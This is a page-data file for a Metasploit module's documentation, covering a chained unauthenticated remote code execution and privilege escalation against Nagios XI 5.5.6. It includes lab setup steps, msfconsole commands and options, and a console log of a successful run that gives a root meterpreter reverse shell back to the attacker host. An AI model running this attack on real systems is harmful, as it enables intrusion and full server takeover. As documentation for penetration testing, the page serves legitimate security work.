{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/nagios_xi_magpie_debug","result":{"data":{"moduleMetadataJson":{"id":"ca4524ce-eada-5a08-aa5d-b3d140c339a8","name":"Nagios XI Magpie_debug.php Root Remote Code Execution","fullname":"exploit/linux/http/nagios_xi_magpie_debug","description":"This module exploits two vulnerabilities in Nagios XI 5.5.6:\n         CVE-2018-15708 which allows for unauthenticated remote code execution\n         and CVE 2018â€“15710 which allows for local privilege escalation.\n         When combined, these two vulnerabilities give us a root reverse shell.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/nagios_xi_magpie_debug","documentationSlug":"/modules/documentation/exploit/linux/http/nagios_xi_magpie_debug"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Nagios XI 5.5.6 Root Remote Code Execution</p>\n<p>The exploit works as follows:</p>\n<ul>\n<li>A local HTTPS server is setup. When it is reached, this server responds with a payload.</li>\n<li>By crafting a malicious request, we make the target host send a request to our HTTPS server. Therefore, the local HTTPS server must be reachable from outside your private network (except if the Nagios server is in the same network as yours obviously), this is what the RSRVHOST and RSRVPORT options are for. The malicious request allows for file upload. A PHP webshell and a meterpreter executable are uploaded.</li>\n<li>A command is executed thanks to the webshell. This command elevates privileges and run the meterpreter executable, giving us a meterpreter session.</li>\n</ul>\n<h1 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h1>\n<ul>\n<li>Install a Ubuntu Linux LTS (I used 18.04 LTS for my tests) in a VM.</li>\n<li>Download Nagios XI 5.5.6 from the official website (<a href=\"https://www.nagios.com/downloads/nagios-xi/older-releases/\">https://www.nagios.com/downloads/nagios-xi/older-releases/</a>).</li>\n<li>Follow the official instructions to install it on your Ubuntu VM (<a href=\"https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf\">https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf</a>).</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">use exploit/linux/http/nagios_xi_root_rce</code></li>\n<li><code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li><code class=\"language-text\">set RSRVHOST [IP]</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n</ol>\n<p>A meterpreter session should have been opened successfully and you should be root</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h2 id=\"rsrvhost\" style=\"position:relative;\"><a href=\"#rsrvhost\" aria-label=\"rsrvhost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RSRVHOST</h2>\n<p>IP at which your local HTTPS can be reached. Most of the time it will be a public IP (e.g. your router IP if you have port forwarding).</p>\n<h2 id=\"rsrvport\" style=\"position:relative;\"><a href=\"#rsrvport\" aria-label=\"rsrvport permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RSRVPORT</h2>\n<p>Port that will forward to your local HTTPS server.</p>\n<h2 id=\"srvhost\" style=\"position:relative;\"><a href=\"#srvhost\" aria-label=\"srvhost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SRVHOST</h2>\n<p>IP of your local HTTPS server (must be a local IP).</p>\n<h2 id=\"srvport\" style=\"position:relative;\"><a href=\"#srvport\" aria-label=\"srvport permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SRVPORT</h2>\n<p>Port to listen to for your local HTTPS server.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h2 id=\"nagios-556-on-ubuntu-1804-lts\" style=\"position:relative;\"><a href=\"#nagios-556-on-ubuntu-1804-lts\" aria-label=\"nagios 556 on ubuntu 1804 lts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nagios 5.5.6 on Ubuntu 18.04 LTS</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/nagios_xi_magpie_debug) &gt; show options\n\nModule options (exploit/linux/http/nagios_xi_magpie_debug):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  5                no        Number of seconds the web server will wait before termination\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     172.16.135.129   yes       The target address range or CIDR identifier\n   RPORT      443              yes       The target port (TCP)\n   RSRVHOST   172.16.135.1     yes       A public IP at which your host can be reached (e.g. your router IP)\n   RSRVPORT   8080             yes       The port that will forward to the local HTTPS server\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        true             no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (linux/x86/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  172.16.135.1     yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Nagios XI 5.5.6\n\n\nmsf5 exploit(linux/http/nagios_xi_magpie_debug) &gt; run\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 172.16.135.1:4444 \nmsf5 exploit(linux/http/nagios_xi_magpie_debug) &gt; [*] Using URL: https://0.0.0.0:8080/ixFonv2\n[*] Local IP: https://192.168.0.21:8080/ixFonv2\n[*] Server started.\n[*] nZOnJhGnMb.php uploaded with success!\n[*] Using URL: https://0.0.0.0:8080/mTwEwHtAuz0V\n[*] Local IP: https://192.168.0.21:8080/mTwEwHtAuz0V\n[*] Server started.\n[*] SQmBobwBzw uploaded with success!\n[*] Sending stage (985320 bytes) to 172.16.135.129\n[*] Meterpreter session 1 opened (172.16.135.1:4444 -&gt; 172.16.135.129:33090) at 2019-06-25 16:13:01 -0500\n[+] Deleted /usr/local/nagvis/share/nZOnJhGnMb.php\n[+] Deleted /usr/local/nagvis/share/SQmBobwBzw\n[!] This exploit may require manual cleanup of &#39;/var/tmp/mtrhbwFZHa.nse&#39; on the target\n[*] Server stopped.\n\nmsf5 exploit(linux/http/nagios_xi_magpie_debug) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.135.129\nOS           : Ubuntu 18.04 (Linux 4.18.0-15-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ca4524ce-eada-5a08-aa5d-b3d140c339a8"}}}